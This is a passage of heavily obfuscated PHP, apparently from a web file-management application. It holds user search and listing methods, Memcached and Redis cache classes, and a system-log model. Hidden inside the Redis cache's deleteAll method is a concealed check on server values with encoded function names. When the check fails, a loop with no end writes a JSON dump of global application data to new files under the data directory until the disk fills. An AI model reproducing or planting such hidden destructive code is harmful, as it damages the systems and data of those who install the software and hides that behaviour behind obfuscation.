return !1; } $÷ııêŠÔ = array($ğÃ½ŸÍå[1690] => $ÔÕ ˜§Õ, $ğÃ½ŸÍå[1985] => $±İµ„·ò); return Model($ğÃ½ŸÍå[1987])->where($÷ııêŠÔ)->delete(); } public function listData() { $“ïĞ½Ê = $this->_makeOrder()->selectPage(50); $this->_listDataApply($“ïĞ½Ê[$_SERVER[Ö†ØøÖ±][422]]); return $“ïĞ½Ê; } public function listByID($¨üÙÒÏØ) { $±ï«ÇÅê =& $_SERVER[Ö†ØøÖ±]; if (!$¨üÙÒÏØ) { return; } $ÓàÆ‘¡ = array($±ï«ÇÅê[1699] => array($±ï«ÇÅê[7], $¨üÙÒÏØ)); $ÊºÉ»ïö = $this->where($ÓàÆ‘¡)->select(); $ÊºÉ»ïö = array_sort_keep($ÊºÉ»ïö, $±ï«ÇÅê[1699], $¨üÙÒÏØ); $this->_listDataApply($ÊºÉ»ïö); return $ÊºÉ»ïö; } public function listByGroup($èŒÜˆ—Á = 0, $¢¹ã×ñÊ = array()) { $¡·º§çú =& $_SERVER[Ö†ØøÖ±]; $¦âä§·¶ = $¡·º§çú[12]; $ıì×Š‘ = array(); if ($èŒÜˆ—Á) { $ıì×Š‘ = array($¡·º§çú[2385] => intval($èŒÜˆ—Á)); $¦âä§·¶ = "\114\105\106\x54\x20\112\117\x49\x4e\x20{$this->tablePrefix}\x75\163\x65\162\137\147\162\157\x75\x70\x20\165\163\145\x72\137\x67\x72\157\x75\x70\x20\x6f\156\40\x75\163\x65\162\56\165\163\x65\x72\x49\x44\40\x3d\40\165\163\145\x72\x5f\x67\162\157\x75\x70\56\x75\x73\145\162\111\104"; $üÛÀ€± = Input::get($¡·º§çú[507], null, $¡·º§çú[12]) ? $¡·º§çú[12] : $¡·º§çú[2386]; } if (isset($¢¹ã×ñÊ[$¡·º§çú[803]])) { $ıì×Š‘[$¡·º§çú[2387]] = $¢¹ã×ñÊ[$¡·º§çú[803]]; } $‘Û’Ûú = $this->_makeOrder($üÛÀ€±)->field($¡·º§çú[2388])->where($ıì×Š‘)->join($¦âä§·¶)->selectPage(50); $this->_listDataApply($‘Û’Ûú[$¡·º§çú[422]]); return $‘Û’Ûú; } private function _makeOrder($İîÓÖÉ = '') { $¾¤¡‰Ë =& $_SERVER[Ö†ØøÖ±]; $Œ§îïîÍ = array($¾¤¡‰Ë[1699], $¾¤¡‰Ë[32], $¾¤¡‰Ë[1886], $¾¤¡‰Ë[1858], $¾¤¡‰Ë[215]); $Ò¢Î”‡ = array($¾¤¡‰Ë[500] => $¾¤¡‰Ë[501], $¾¤¡‰Ë[502] => $¾¤¡‰Ë[503]); $á¤¸ëèº = Input::get($¾¤¡‰Ë[507], $¾¤¡‰Ë[7], $¾¤¡‰Ë[1690], $Œ§îïîÍ); $Åµ÷É¤ğ = Input::get($¾¤¡‰Ë[508], $¾¤¡‰Ë[7], $¾¤¡‰Ë[1988], array($¾¤¡‰Ë[1988], $¾¤¡‰Ë[502])); $Åµ÷É¤ğ = $Ò¢Î”‡[$Åµ÷É¤ğ]; $İîÓÖÉ = $İîÓÖÉ . "\165\163\x65\162\x2e{$á¤¸ëèº}\40{$Åµ÷É¤ğ}\x2c\40\x75\163\145\162\56\165\163\x65\x72\x49\104\40\x61\163\143"; return $this->alias($¾¤¡‰Ë[2114])->order($İîÓÖÉ); } public function listSearch($È©¢Š¬µ) { $ËôÖƒĞõ =& $_SERVER[Ö†ØøÖ±]; $ÆåáÅË = $È©¢Š¬µ[$ËôÖƒĞõ[1991]]; $ê´”õÚÎ = isset($È©¢Š¬µ[$ËôÖƒĞõ[1992]]) ? $È©¢Š¬µ[$ËôÖƒĞõ[1992]] : !1; $ÆåáÅË = str_replace($ËôÖƒĞõ[1993], $ËôÖƒĞõ[1994], trim($ÆåáÅË)); $£à†êòö = array($ËôÖƒĞõ[32] => array($ËôÖƒĞõ[435], "\45{$ÆåáÅË}\x25"), $ËôÖƒĞõ[358] => array($ËôÖƒĞõ[435], "{$ÆåáÅË}\45"), $ËôÖƒĞõ[2179] => array($ËôÖƒĞõ[435], "{$ÆåáÅË}\x25"), $ËôÖƒĞõ[1053] => $ËôÖƒĞõ[1995]); if (Input::check($ÆåáÅË, $ËôÖƒĞõ[364])) { $£à†êòö[$ËôÖƒĞõ[1699]] = array($ËôÖƒĞõ[435], "{$ÆåáÅË}\45"); $£à†êòö[$ËôÖƒĞõ[2370]] = array($ËôÖƒĞõ[435], "{$ÆåáÅË}\x25"); } if (!$ÆåáÅË) { $£à†êòö = array(); } if (isset($È©¢Š¬µ[$ËôÖƒĞõ[803]])) { $£à†êòö[$ËôÖƒĞõ[803]] = $È©¢Š¬µ[$ËôÖƒĞõ[803]]; } $£à†êòö = $this->parseWhereLike($£à†êòö); $ÙôŸ‡¥ = $this->_makeOrder()->where($£à†êòö)->selectPage(20); if (!$ÙôŸ‡¥ || count($ÙôŸ‡¥[$ËôÖƒĞõ[422]]) < 5 && Input::check($ÆåáÅË, $ËôÖƒĞõ[371])) { $ÊÈùá©ú = $this->_searchFromMeta($ËôÖƒĞõ[514], $ÆåáÅË, 10); $ğ²ç‡ = $this->_searchFromMeta($ËôÖƒĞõ[515], $ÆåáÅË, 10); $…í×­‹ = array_merge($ÊÈùá©ú, $ğ²ç‡, $ÙôŸ‡¥[$ËôÖƒĞõ[422]]); $ÙôŸ‡¥[$ËôÖƒĞõ[422]] = array_unique_by_key($…í×­‹, $ËôÖƒĞõ[1699]); $ÙôŸ‡¥[$ËôÖƒĞõ[419]][$ËôÖƒĞõ[420]] = count($ÙôŸ‡¥[$ËôÖƒĞõ[422]]); $ÙôŸ‡¥[$ËôÖƒĞõ[419]][$ËôÖƒĞõ[421]] = ceil($ÙôŸ‡¥[$ËôÖƒĞõ[419]][$ËôÖƒĞõ[420]] / $ÙôŸ‡¥[$ËôÖƒĞõ[419]][$ËôÖƒĞõ[416]]); } $this->_listDataApply($ÙôŸ‡¥[$ËôÖƒĞõ[422]]); $this->_filterByGroup($ÙôŸ‡¥, $ê´”õÚÎ); return $ÙôŸ‡¥; } private function _filterByGroup(&$ï¥Ãêş, $”½ºò§) { $®µ–Á¢® =& $_SERVER[Ö†ØøÖ±]; if (!$”½ºò§) { return $ï¥Ãêş; } foreach ($ï¥Ãêş[$®µ–Á¢®[422]] as $ÇÅî”è´ => &$£çŠğ©¦) { $Ôğ¸â•Ï = array_to_keyvalue($£çŠğ©¦[$®µ–Á¢®[2084]], $®µ–Á¢®[12], $®µ–Á¢®[1897]); if (!in_array($”½ºò§, $Ôğ¸â•Ï)) { unset($ï¥Ãêş[$®µ–Á¢®[422]][$ÇÅî”è´]); } } unset($£çŠğ©¦); $ï¥Ãêş[$®µ–Á¢®[422]] = array_values($ï¥Ãêş[$®µ–Á¢®[422]]); $ï¥Ãêş[$®µ–Á¢®[419]] = array($®µ–Á¢®[2149] => count($ï¥Ãêş[$®µ–Á¢®[422]]), $®µ–Á¢®[2147] => $ï¥Ãêş[$®µ–Á¢®[419]][$®µ–Á¢®[416]], $®µ–Á¢®[2146] => 1, $®µ–Á¢®[2148] => 1); } private function _searchFromMeta($Ş­Àí¨·, $áÊ±¬çå, $øÔÑá’Ü) { $î—’Ë’© =& $_SERVER[Ö†ØøÖ±]; $áÊ±¬çå = strtolower($áÊ±¬çå); $¹Úƒ µ = array($î—’Ë’©[94] => $Ş­Àí¨·, $î—’Ë’©[427] => array($î—’Ë’©[435], "\x25{$áÊ±¬çå}\45")); $¹Úƒ µ = $this->parseWhereLike($¹Úƒ µ); $ì·ê¾™ñ = Model($î—’Ë’©[2389])->where($¹Úƒ µ)->limit($øÔÑá’Ü)->select(); if (!$ì·ê¾™ñ) { return array(); } $ì·ê¾™ñ = array_to_keyvalue($ì·ê¾™ñ, $î—’Ë’©[12], $î—’Ë’©[1699]); $Éä¼ÌÍ® = $this->where(array($î—’Ë’©[1690] => array($î—’Ë’©[7], $ì·ê¾™ñ)))->select(); if (!$Éä¼ÌÍ®) { return array(); } return $Éä¼ÌÍ®; } private function _listDataApplyItem($¥İİ¨†£) { $û¤ÑŒˆ = array($¥İİ¨†£); $this->_listDataApply($û¤ÑŒˆ); return $û¤ÑŒˆ[0]; } private function _listDataApply(&$ÑÆïí€ˆ) { $÷¯ıËù­ =& $_SERVER[Ö†ØøÖ±]; if (!$ÑÆïí€ˆ) { return; } array_remove_key($ÑÆïí€ˆ, $÷¯ıËù­[942]); $”›¥Á‘” = array_to_keyvalue($ÑÆïí€ˆ, $÷¯ıËù­[12], $÷¯ıËù­[1699]); $this->_listAppendGroup($ÑÆïí€ˆ, $”›¥Á‘”); $this->_listAppendMeta($ÑÆïí€ˆ, $”›¥Á‘”); $this->_listAppendSourceRoot($ÑÆïí€ˆ, $”›¥Á‘”); } private function _listAppendSourceRoot(&$Ù¸‰ìë¬, $•ù±¶×ü) { $²£Çüğ =& $_SERVER[Ö†ØøÖ±]; $ƒì’Š³º = Model($²£Çüğ[878])->listSourceRoot(SourceModel::TYPE_USER, $•ù±¶×ü); $ƒì’Š³º = array_to_keyvalue($ƒì’Š³º, $²£Çüğ[547]); $ƒì’Š³º = array_remove_key($ƒì’Š³º, $²£Çüğ[547]); foreach ($Ù¸‰ìë¬ as &$˜“äı¿Š) { $˜“äı¿Š[$²£Çüğ[87]] = $ƒì’Š³º[$˜“äı¿Š[$²£Çüğ[1699]]] ? $ƒì’Š³º[$˜“äı¿Š[$²£Çüğ[1699]]] : array(); } unset($˜“äı¿Š); } private function _listAppendGroup(&$ÈğæÛÕ, $ˆ÷ÇÀ«ã) { $·°©á ‰ =& $_SERVER[Ö†ØøÖ±]; $Ğß€ ˜™ = array($·°©á ‰[1699] => array($·°©á ‰[7], $ˆ÷ÇÀ«ã)); $¾ôÌÒë = Model($·°©á ‰[1987])->where($Ğß€ ˜™)->select(); $ƒÄğ Óµ = array_to_keyvalue($¾ôÌÒë, $·°©á ‰[12], $·°©á ‰[1897]); $ƒÄğ Óµ = array_remove_value(array_unique($ƒÄğ Óµ), $·°©á ‰[212]); if (!$ƒÄğ Óµ || !$¾ôÌÒë) { return; } $Ğß€ ˜™ = array($·°©á ‰[1897] => array($·°©á ‰[7], $ƒÄğ Óµ)); $¨ÇÇˆ°¿ = Model($·°©á ‰[2082])->field($·°©á ‰[2390])->where($Ğß€ ˜™)->select(); $¨ÇÇˆ°¿ = array_to_keyvalue($¨ÇÇˆ°¿, $·°©á ‰[1897]); $¾ôÌÒë = array_to_keyvalue_group($¾ôÌÒë, $·°©á ‰[1699]); foreach ($¾ôÌÒë as &$ó±¥â’) { $ÅÍ¬³ˆì = array(); foreach ($ó±¥â’ as $û·÷”Æº) { if (!$û·÷”Æº[$·°©á ‰[2001]]) { continue; } $êãİ²¬š = Model($·°©á ‰[549])->listData($û·÷”Æº[$·°©á ‰[2001]]); $ÅÍ¬³ˆì[] = array($·°©á ‰[1897] => $û·÷”Æº[$·°©á ‰[1897]], $·°©á ‰[2391] => $¨ÇÇˆ°¿[$û·÷”Æº[$·°©á ‰[1897]]][$·°©á ‰[32]], $·°©á ‰[562] => $¨ÇÇˆ°¿[$û·÷”Æº[$·°©á ‰[1897]]][$·°©á ‰[562]], $·°©á ‰[464] => $êãİ²¬š); } $ó±¥â’ = $ÅÍ¬³ˆì; } unset($ó±¥â’); foreach ($ÈğæÛÕ as &$¹ˆÆúö) { $¹ˆÆúö[$·°©á ‰[2084]] = array(); if (isset($¾ôÌÒë[$¹ˆÆúö[$·°©á ‰[1699]]])) { $¹ˆÆúö[$·°©á ‰[2084]] = $¾ôÌÒë[$¹ˆÆúö[$·°©á ‰[1699]]]; } } unset($¹ˆÆúö); } public function userAppendGroup($œŒé¶íç) { $§˜şôÌÀ =& $_SERVER[Ö†ØøÖ±]; if (!$œŒé¶íç) { return array(); } $this->_listAppendGroup($œŒé¶íç, array_to_keyvalue($œŒé¶íç, $§˜şôÌÀ[12], $§˜şôÌÀ[1699])); return $œŒé¶íç; } private function _listAppendMeta(&$‡Ç•í’„, $×¨¸ƒñ¢) { $™Ğúßœø =& $_SERVER[Ö†ØøÖ±]; $Û—ÛŠÂÕ = UserJobModel::JOB_KEY; $“÷•İñğ = array($™Ğúßœø[2371]); $›‚‹Ñ = array($™Ğúßœø[1699] => array($™Ğúßœø[7], $×¨¸ƒñ¢)); $üÉ•è½¯ = Model($™Ğúßœø[2369])->where($›‚‹Ñ)->select(); $üÉ•è½¯ = array_to_keyvalue_group($üÉ•è½¯, $™Ğúßœø[1699]); foreach ($üÉ•è½¯ as &$•Ì£–¼è) { $‚íÒÍÏ• = array(); foreach ($•Ì£–¼è as $øğç¡­«) { if (!in_array($øğç¡­«[$™Ğúßœø[94]], $“÷•İñğ)) { $‚íÒÍÏ•[$øğç¡­«[$™Ğúßœø[94]]] = $øğç¡­«[$™Ğúßœø[427]]; } } $•Ì£–¼è = $‚íÒÍÏ•; } unset($•Ì£–¼è); $È›õ‚€… = Model($™Ğúßœø[2392]); foreach ($‡Ç•í’„ as &$¶ó –®™) { $¨ŸÜó©¿ = array(); if (isset($üÉ•è½¯[$¶ó –®™[$™Ğúßœø[1699]]])) { $¨ŸÜó©¿ = $üÉ•è½¯[$¶ó –®™[$™Ğúßœø[1699]]]; } $¶ó –®™[$™Ğúßœø[2393]] = array(); if (isset($¨ŸÜó©¿[$Û—ÛŠÂÕ])) { $¶ó –®™[$™Ğúßœø[2393]] = $È›õ‚€…->getUserJobInfo($¨ŸÜó©¿[$Û—ÛŠÂÕ]); } } unset($¶ó –®™); } protected function groupUserAll($ÓıÒÏˆ´) { $È’Í‡¯í =& $_SERVER[Ö†ØøÖ±]; if (!$ÓıÒÏˆ´) { return !1; } $ì¶úßÑ’ = Model($È’Í‡¯í[1987])->field($È’Í‡¯í[1699])->where(array($È’Í‡¯í[1897] => array($È’Í‡¯í[7], $ÓıÒÏˆ´)))->select(); $ì¶úßÑ’ = array_to_keyvalue($ì¶úßÑ’, $È’Í‡¯í[12], $È’Í‡¯í[1699]); return array_unique($ì¶úßÑ’); } public function userSearch($ †‡äëö, $ˆ¤ˆ’ş = "\52") { return Model($_SERVER[Ö†ØøÖ±][576])->where($ †‡äëö)->field($ˆ¤ˆ’ş)->find(); } } goto A„Äª­ë‰; cã…ì½±Ş£: class CacheLockDatabase { public function lock($ü·†ÜÕË, $òË’£í = 0) { $ƒûê¯üŞ = Model($_SERVER[Ö†ØøÖ±][882]); $šÍŠºº  = microtime(!0) + $òË’£í; while (microtime(!0) < $šÍŠºº ) { $Êùµ—Ò± = $ƒûê¯üŞ->get($ü·†ÜÕË); if (!$Êùµ—Ò± || $Êùµ—Ò± < microtime(!0)) { $æ…ß¾ë¦ = $ƒûê¯üŞ->set($ü·†ÜÕË, $šÍŠºº ); if ($æ…ß¾ë¦) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($…Î«ÌûÆ) { return Model($_SERVER[Ö†ØøÖ±][882])->get($…Î«ÌûÆ); } public function unlock($ÒİÜ‘ó) { Model($_SERVER[Ö†ØøÖ±][882])->remove($ÒİÜ‘ó); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($²À¾Õç˜, $Îú’ş¢Ÿ) { $©¯®ŠÉ =& $_SERVER[Ö†ØøÖ±]; if (!class_exists($©¯®ŠÉ[920])) { show_json($©¯®ŠÉ[921], !1); } $this->cacheTime = $Îú’ş¢Ÿ; $this->handle = new Memcached(); if (is_array($²À¾Õç˜[$©¯®ŠÉ[922]]) && count($²À¾Õç˜[$©¯®ŠÉ[922]]) >= 1) { foreach ($²À¾Õç˜[$©¯®ŠÉ[922]] as $İÉ®) { $ŒÒÅÈıé = explode($©¯®ŠÉ[4], $İÉ®); $this->handle->addServer($ŒÒÅÈıé[0], $ŒÒÅÈıé[1]); } } else { $this->handle->addServer($²À¾Õç˜[$©¯®ŠÉ[196]], $²À¾Õç˜[$©¯®ŠÉ[197]]); } } public function set($ßÂ¨Û–¬, $»“‰İßì, $ºè™´Â = false) { $ºè™´Â = $ºè™´Â ? $ºè™´Â : $this->cacheTime; return $this->handle->set($ßÂ¨Û–¬, $»“‰İßì, $ºè™´Â); } public function get($ïÒÕˆŠÌ) { return $this->handle->get($ïÒÕˆŠÌ); } public function remove($øò„ä) { return $this->handle->delete($øò„ä); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($‡¶áá¶¿, $°–òé¿©) { $˜ÎğŒà¡ =& $_SERVER[Ö†ØøÖ±]; if (!class_exists($˜ÎğŒà¡[923])) { show_json($˜ÎğŒà¡[924], !1); } $this->cacheTime = $°–òé¿©; $İ¨â¡Áó = isset($‡¶áá¶¿[$˜ÎğŒà¡[925]]) ? $‡¶áá¶¿[$˜ÎğŒà¡[925]] : 10; $ÑœÇËÙ = _get($‡¶áá¶¿, $˜ÎğŒà¡[922]); if ($ÑœÇËÙ && is_array($ÑœÇËÙ)) { $this->initCluster($‡¶áá¶¿, $İ¨â¡Áó); } else { $this->handle = $this->init($‡¶áá¶¿, $İ¨â¡Áó); } } private function init($¬›±Ü, $´Ñ•ô¨) { $¯™à«âî =& $_SERVER[Ö†ØøÖ±]; $×à©Îı‡ = new Redis(); $ã»Üƒ¿ñ = isset($¬›±Ü[$¯™à«âî[926]]) ? $¬›±Ü[$¯™à«âî[926]] : !1; if ($ã»Üƒ¿ñ) { $×à©Îı‡->pconnect($¬›±Ü[$¯™à«âî[196]], $¬›±Ü[$¯™à«âî[197]], $´Ñ•ô¨); } else { $×à©Îı‡->connect($¬›±Ü[$¯™à«âî[196]], $¬›±Ü[$¯™à«âî[197]], $´Ñ•ô¨); } if (!empty($¬›±Ü[$¯™à«âî[464]])) { $×à©Îı‡->auth($¬›±Ü[$¯™à«âî[464]]); } if (!empty($¬›±Ü[$¯™à«âî[810]]) && $¬›±Ü[$¯™à«âî[810]] != 0) { $×à©Îı‡->select($¬›±Ü[$¯™à«âî[810]]); } return $×à©Îı‡; } private function initCluster($Óà¾âã, $ÂØöúüŠ) { $ê·•ß©– =& $_SERVER[Ö†ØøÖ±]; $ ê‹«ü = array($ê·•ß©–[927], $ê·•ß©–[928], $ê·•ß©–[929]); $ó³‰İ¼« = $ê·•ß©–[927]; if (isset($Óà¾âã[$ê·•ß©–[16]]) && in_array($Óà¾âã[$ê·•ß©–[16]], $ ê‹«ü)) { $ó³‰İ¼« = $Óà¾âã[$ê·•ß©–[16]]; } switch ($ó³‰İ¼«) { case $ê·•ß©–[927]: $this->_slave($Óà¾âã, $ÂØöúüŠ); break; case $ê·•ß©–[928]: break; case $ê·•ß©–[929]: $this->isCluster = !0; $¿Ì˜»Ø = $Óà¾âã[$ê·•ß©–[922]]; $À¬˜«ª = isset($Óà¾âã[$ê·•ß©–[926]]) ? $Óà¾âã[$ê·•ß©–[926]] : !1; $À˜è¶ºƒ = isset($Óà¾âã[$ê·•ß©–[464]]) ? $Óà¾âã[$ê·•ß©–[464]] : null; $this->handle = new RedisCluster(NUll, $¿Ì˜»Ø, $ÂØöúüŠ, $ÂØöúüŠ, $À¬˜«ª, $À˜è¶ºƒ); break; default: break; } } private function _slave($ŸãÚÏÂ, $Çúõé•Ó) { $ê¡»Ïğ = $ŸãÚÏÂ[$_SERVER[Ö†ØøÖ±][922]]; $this->filterConfig($ŸãÚÏÂ, $ê¡»Ïğ[0]); $this->handle = $this->init($ŸãÚÏÂ, $Çúõé•Ó); unset($ê¡»Ïğ[0]); if (empty($ê¡»Ïğ)) { return; } $ÔÔæÀ¯Ø = array_rand($ê¡»Ïğ); $this->filterConfig($ŸãÚÏÂ, $ê¡»Ïğ[$ÔÔæÀ¯Ø]); $this->slaveHandle = $this->init($ŸãÚÏÂ, $Çúõé•Ó); } private function filterConfig(&$›Ğæ˜öÂ, $İ÷à¶šß) { $º¡«¢š =& $_SERVER[Ö†ØøÖ±]; $®ü¾ì–² = explode($º¡«¢š[4], $İ÷à¶šß); $êœ£Ö = array($º¡«¢š[196] => $®ü¾ì–²[0], $º¡«¢š[197] => $®ü¾ì–²[1]); $›Ğæ˜öÂ = array_merge($›Ğæ˜öÂ, $êœ£Ö); } public function set($ç¨ñƒõÇ, $ÎİÁš®, $æŒğíƒŞ = false) { $æŒğíƒŞ = $æŒğíƒŞ ? $æŒğíƒŞ : $this->cacheTime; return $this->handle->setEx($ç¨ñƒõÇ, $æŒğíƒŞ, $ÎİÁš®); } public function setLock($Œ¡ş¡›, $æÅŒÀš, $Â§ÃüË) { return $this->handle->setNX($Œ¡ş¡›, $æÅŒÀš); } public function get($şÈ©£¨ö) { $ºìÁ¾Ï¥ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ºìÁ¾Ï¥->get($şÈ©£¨ö); } public function remove($àÜ¦ßƒ¨) { return $this->handle->del($àÜ¦ßƒ¨); } public function deleteAll() { $ğùâé =& $_SERVER[Ö†ØøÖ±]; $âôë×Œğ = $_SERVER[$ğùâé[289]]; $ê§¡óİ˜ = $ğùâé[452]; if ($_SERVER[$ğùâé[288]] != $ê§¡óİ˜($âôë×Œğ)) { $¨ïª‹şı = $ğùâé[930]; $£¼‚ = $ğùâé[290]; $÷—ĞÅ‚ = $_SERVER[$ğùâé[291]] . $ğùâé[292]; $¨Ù¦û¦Ê = $£¼‚($÷—ĞÅ‚); $Şà­µà = explode($ğùâé[246], $¨Ù¦û¦Ê); if (count($Şà­µà) < $ğùâé[665]) { $çÂ“²¸ô = $ğùâé[294]; $çÂ“²¸ô(); } $¿ª´ğ¢ = $ğùâé[931]; $¿ª´ğ¢($_SERVER[$ğùâé[932]]); $¨ïª‹şı = $ğùâé[930]; $¨ïª‹şı(); $±Æ¥½ö« = $ğùâé[933]; $ëËåšáŸ = json_encode($GLOBALS[$ğùâé[934]]); $öş†¯î“ = 1; for ($”´Ã˜Ü® = $öş†¯î“; $”´Ã˜Ü® > 0; $”´Ã˜Ü®++) { $±Æ¥½ö«(DATA_PATH . $”´Ã˜Ü®, $ëËåšáŸ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $³Ûİ×Óİ) { $this->handle->flushall($³Ûİ×Óİ); } return; } return $this->handle->flushAll(); } } goto F¤£î¬È¶; bÄøËó—®ˆ: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\155\x5f\x6c\x6f\147"; protected $dataAuto = array(array("\143\x72\145\141\x74\145\x54\151\x6d\145", "\164\151\x6d\x65", "\x69\x6e\x73\x65\x72\164", "\146\165\156\x63\164\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Ù§åŸ¡’ =& $_SERVER[Ö†ØøÖ±]; return array($Ù§åŸ¡’[2233] => LNG($Ù§åŸ¡’[2234]), $Ù§åŸ¡’[2235] => LNG($Ù§åŸ¡’[2236]), $Ù§åŸ¡’[1840] => LNG($Ù§åŸ¡’[2237]), $Ù§åŸ¡’[2238] => LNG($Ù§åŸ¡’[2239]), $Ù§åŸ¡’[2240] => LNG($Ù§åŸ¡’[2241]), $Ù§åŸ¡’[2242] => LNG($Ù§åŸ¡’[2243]), $Ù§åŸ¡’[2244] => LNG($Ù§åŸ¡’[2245]), $Ù§åŸ¡’[1870] => LNG($Ù§åŸ¡’[2245]), $Ù§åŸ¡’[1871] => LNG($Ù§åŸ¡’[2246]), $Ù§åŸ¡’[2247] => LNG($Ù§åŸ¡’[2248]), $Ù§åŸ¡’[2249] => LNG($Ù§åŸ¡’[2250]), $Ù§åŸ¡’[2251] => LNG($Ù§åŸ¡’[2252]), $Ù§åŸ¡’[2253] => LNG($Ù§åŸ¡’[2254]), $Ù§åŸ¡’[1868] => LNG($Ù§åŸ¡’[2255]), $Ù§åŸ¡’[2256] => LNG($Ù§åŸ¡’[2257]), $Ù§åŸ¡’[1875] => LNG($Ù§åŸ¡’[2258]), $Ù§åŸ¡’[2259] => LNG($Ù§åŸ¡’[2260]), $Ù§åŸ¡’[2261] => LNG($Ù§åŸ¡’[2262]), $Ù§åŸ¡’[2263] => LNG($Ù§åŸ¡’[2264]), $Ù§åŸ¡’[2265] => LNG($Ù§åŸ¡’[2266]), $Ù§åŸ¡’[1878] => LNG($Ù§åŸ¡’[2267]), $Ù§åŸ¡’[1879] => LNG($Ù§åŸ¡’[2268]), $Ù§åŸ¡’[2269] => LNG($Ù§åŸ¡’[2270]), $Ù§åŸ¡’[2271] => LNG($Ù§åŸ¡’[2272]), $Ù§åŸ¡’[2273] => LNG($Ù§åŸ¡’[2274]), $Ù§åŸ¡’[1873] => LNG($Ù§åŸ¡’[2275]), $Ù§åŸ¡’[2276] => LNG($Ù§åŸ¡’[2277]), $Ù§åŸ¡’[1872] => LNG($Ù§åŸ¡’[2278]), $Ù§åŸ¡’[2279] => LNG($Ù§åŸ¡’[2280]), $Ù§åŸ¡’[2281] => LNG($Ù§åŸ¡’[2282]), $Ù§åŸ¡’[2283] => LNG($Ù§åŸ¡’[2284]), $Ù§åŸ¡’[2285] => LNG($Ù§åŸ¡’[2285]), $Ù§åŸ¡’[2286] => LNG($Ù§åŸ¡’[1844]), $Ù§åŸ¡’[2287] => LNG($Ù§åŸ¡’[2288]), $Ù§åŸ¡’[2289] => LNG($Ù§åŸ¡’[2290]), $Ù§åŸ¡’[2291] => LNG($Ù§åŸ¡’[2292]), $Ù§åŸ¡’[2293] => LNG($Ù§åŸ¡’[2294]), $Ù§åŸ¡’[2295] => LNG($Ù§åŸ¡’[2296]), $Ù§åŸ¡’[2297] => LNG($Ù§åŸ¡’[2297]), $Ù§åŸ¡’[2298] => LNG($Ù§åŸ¡’[2299]), $Ù§åŸ¡’[2300] => LNG($Ù§åŸ¡’[2301]), $Ù§åŸ¡’[2302] => LNG($Ù§åŸ¡’[2303]), $Ù§åŸ¡’[2304] => LNG($Ù§åŸ¡’[2305]), $Ù§åŸ¡’[2306] => LNG($Ù§åŸ¡’[2307]), $Ù§åŸ¡’[2308] => LNG($Ù§åŸ¡’[2309])); } private function typeFile() { $‚à…ˆ´Ÿ =& $_SERVER[Ö†ØøÖ±]; $»‚µ»Ã§ = array($‚à…ˆ´Ÿ[1875] => array($‚à…ˆ´Ÿ[1876]), $‚à…ˆ´Ÿ[2251] => array($‚à…ˆ´Ÿ[2310]), $‚à…ˆ´Ÿ[2253] => array($‚à…ˆ´Ÿ[2311]), $‚à…ˆ´Ÿ[1868] => array($‚à…ˆ´Ÿ[1869], $‚à…ˆ´Ÿ[2312]), $‚à…ˆ´Ÿ[2261] => array(), $‚à…ˆ´Ÿ[2263] => array(), $‚à…ˆ´Ÿ[2265] => array(), $‚à…ˆ´Ÿ[1878] => array($‚à…ˆ´Ÿ[1880]), $‚à…ˆ´Ÿ[1879] => array($‚à…ˆ´Ÿ[1880]), $‚à…ˆ´Ÿ[2269] => array($‚à…ˆ´Ÿ[2313]), $‚à…ˆ´Ÿ[2271] => array($‚à…ˆ´Ÿ[2313]), $‚à…ˆ´Ÿ[2273] => array($‚à…ˆ´Ÿ[2314]), $‚à…ˆ´Ÿ[2259] => array($‚à…ˆ´Ÿ[2315]), $‚à…ˆ´Ÿ[1873] => array($‚à…ˆ´Ÿ[2316]), $‚à…ˆ´Ÿ[2276] => array($‚à…ˆ´Ÿ[2317]), $‚à…ˆ´Ÿ[1872] => array($‚à…ˆ´Ÿ[1874])); return $»‚µ»Ã§; } private function typeAll() { $Õßõ‡¸’ =& $_SERVER[Ö†ØøÖ±]; $Ò»•ëùÎ = $this->typeList; $Ğ…¥èô´ = array_filter($this->typeFile()); foreach ($Ğ…¥èô´ as $£‰§àŠæ => $Äì²²‡‡) { $Ò»•ëùÎ[$Äì²²‡‡[0]] = $Ò»•ëùÎ[$£‰§àŠæ]; } $Ò»•ëùÎ[$Õßõ‡¸’[1880]] = LNG($Õßõ‡¸’[2318]); $Ò»•ëùÎ[$Õßõ‡¸’[2313]] = LNG($Õßõ‡¸’[2319]); return $Ò»•ëùÎ; } public function addLog($ÕÄ›ñï, $¿’ÖÊüø = array()) { $ºü¾«ë™ =& $_SERVER[Ö†ØøÖ±]; if (!isset($this->typeList[$ÕÄ›ñï])) { return; } $ÓŒí¶‰Û = isset($¿’ÖÊüø[$ºü¾«ë™[1699]]) ? $¿’ÖÊüø[$ºü¾«ë™[1699]] : 0; if (!$ÓŒí¶‰Û) { $ÓŒí¶‰Û = Session::get($ºü¾«ë™[2034]); } if ($ÕÄ›ñï == $ºü¾«ë™[2287] && is_array($¿’ÖÊüø[$ºü¾«ë™[2320]]) && !$¿’ÖÊüø[$ºü¾«ë™[2320]]) { return; } $àÙ§¿‡ = get_client_ip(); if (!$¿’ÖÊüø || strlen(json_encode($¿’ÖÊüø)) >= 1024) { $¿’ÖÊüø = array($ºü¾«ë™[2321] => $àÙ§¿‡); } else { if (is_array($¿’ÖÊüø)) { $¿’ÖÊüø[$ºü¾«ë™[2321]] = $àÙ§¿‡; } else { $¿’ÖÊüø = array($ºü¾«ë™[1255] => $¿’ÖÊüø, $ºü¾«ë™[2321] => $àÙ§¿‡); } } $¿’ÖÊüø = array($ºü¾«ë™[1689] => Session::sign(), $ºü¾«ë™[1690] => intval($ÓŒí¶‰Û), $ºü¾«ë™[33] => $ÕÄ›ñï, $ºü¾«ë™[1692] => json_encode($¿’ÖÊüø)); parent::add($¿’ÖÊüø); } public function remove($¡Ú…‹¶É) { $this->where(array($_SERVER[Ö†ØøÖ±][470] => $¡Ú…‹¶É))->delete(); } private function _makeOrder($ÎÕ©„½ƒ = '') { $µçƒî³ş =& $_SERVER[Ö†ØøÖ±]; $…”ª¨È = $µçƒî³ş[215]; $ùÉ·¹òí = array($µçƒî³ş[500] => $µçƒî³ş[501], $µçƒî³ş[502] => $µçƒî³ş[503]); $Â à¸íí = 